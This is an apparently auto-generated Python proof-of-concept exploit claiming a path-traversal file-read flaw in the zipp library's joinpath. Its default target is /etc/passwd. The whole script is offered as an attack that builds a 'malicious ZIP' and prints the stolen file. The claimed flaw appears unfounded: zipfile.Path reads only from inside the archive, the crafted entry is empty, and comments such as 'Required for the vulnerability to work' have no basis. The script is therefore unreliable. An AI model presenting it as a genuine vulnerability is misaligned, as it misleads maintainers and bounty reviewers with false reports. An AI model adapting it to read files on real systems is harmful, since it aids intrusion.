#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: lfi-001
# Auto-generated — run with: python3 zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c-lfi-001-poc.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c.

Vulnerability: The joinpath method does not sanitize '..' path components, allowing
directory traversal. When combined with read_bytes() or read_text(), an attacker can
read arbitrary files from the filesystem if they can control the path passed to joinpath.

This PoC demonstrates the vulnerability by reading /etc/passwd (benign file).
"""

import io
import zipfile
import os
import sys
import tempfile
import argparse

def create_malicious_zip(target_file: str) -> bytes:
    """
    Create a ZIP archive containing a file with a path traversal payload.
    
    The payload uses '../' to escape the ZIP directory and read an arbitrary file.
    We write a dummy entry with the traversal path, then use joinpath to access it.
    
    Args:
        target_file: The absolute path of the file to read (e.g., '/etc/passwd')
    
    Returns:
        Bytes of the crafted ZIP file
    """
    data = io.BytesIO()
    zf = zipfile.ZipFile(data, "w")
    
    # Calculate how many '../' we need to reach root from any depth
    # The ZIP stores paths relative to root, so we just need enough '..' to escape
    # We'll use a path like '../../../../etc/passwd' to reach root
    # First, determine how many levels deep we need to go
    # Since the ZIP root is at the top, we just need to go up enough times
    depth = target_file.count(os.sep)  # Number of directories to traverse up
    traversal = '../' * depth + target_file.lstrip('/')
    
    # Write the file with the traversal path
    zf.writestr(traversal, b"")  # Empty content, we'll read the real file
    zf.filename = ''  # Required for the vulnerability to work
    
    zf.close()
    return data.getvalue()

def exploit_zip(zip_bytes: bytes, target_file: str) -> str:
    """
    Exploit the LFI vulnerability using a crafted ZIP file.
    
    Args:
        zip_bytes: The crafted ZIP file as bytes
        target_file: The file to read (for error messages)
    
    Returns:
        Contents of the target file as string
    
    Raises:
        FileNotFoundError: If the target file doesn't exist in the ZIP context
        Exception: For other errors
    """
    # Load the ZIP from memory
    zf = zipfile.ZipFile(io.BytesIO(zip_bytes))
    root = zipfile.Path(zf)
    
    # Navigate to the traversal entry
    # The entry will be something like '../../../../etc/passwd'
    # We need to find it in the directory listing
    entries = list(root.iterdir())
    
    # Find the traversal entry (it will have '../' in its name)
    traversal_entry = None
    for entry in entries:
        if '..' in str(entry):
            traversal_entry = entry
            break
    
    if traversal_entry is None:
        raise FileNotFoundError(f"Could not find traversal entry for {target_file}")
    
    # Now use joinpath to traverse to the target file
    # The entry name is something like '../' so we join with the relative path
    # to the target file from the ZIP root
    relative_path = target_file.lstrip('/')
    target_path = traversal_entry.joinpath(relative_path)
    
    # Read the file using read_bytes()
    try:
        content = target_path.read_bytes()
        return content.decode('utf-8', errors='replace')
    except FileNotFoundError:
        raise FileNotFoundError(f"Target file {target_file} not found or not accessible")
    except IsADirectoryError:
        raise IsADirectoryError(f"{target_file} is a directory")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in zipp library - read arbitrary files via ZIP traversal"
    )
    parser.add_argument(
        "-f", "--file",
        default="/etc/passwd",
        help="Target file to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Save output to file instead of stdout"
    )
    args = parser.parse_args()
    
    target_file = args.file
    
    print(f"[*] Creating malicious ZIP for target: {target_file}")
    print(f"[*] This demonstrates LFI via path traversal in zipp library")
    print(f"[*] The vulnerability allows reading arbitrary files by using '..' in ZIP entries")
    print()
    
    try:
        # Step 1: Create the malicious ZIP
        print("[*] Step 1: Crafting malicious ZIP archive...")
        zip_bytes = create_malicious_zip(target_file)
        print(f"[+] Successfully created ZIP ({len(zip_bytes)} bytes)")
        
        # Step 2: Exploit the vulnerability
        print(f"[*] Step 2: Exploiting LFI to read {target_file}...")
        content = exploit_zip(zip_bytes, target_file)
        
        # Step 3: Display the result
        print(f"[+] Successfully read {target_file}!")
        print(f"[*] File contents ({len(content)} bytes):")
        print("-" * 60)
        print(content)
        print("-" * 60)
        
        # Optionally save to file
        if args.output:
            with open(args.output, 'w') as f:
                f.write(content)
            print(f"[+] Saved output to {args.output}")
            
    except FileNotFoundError as e:
        print(f"[-] Error: {e}")
        print("[*] This is expected if the target file doesn't exist or permissions deny access")
        sys.exit(1)
    except IsADirectoryError as e:
        print(f"[-] Error: {e}")
        print("[*] The target is a directory, not a file")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
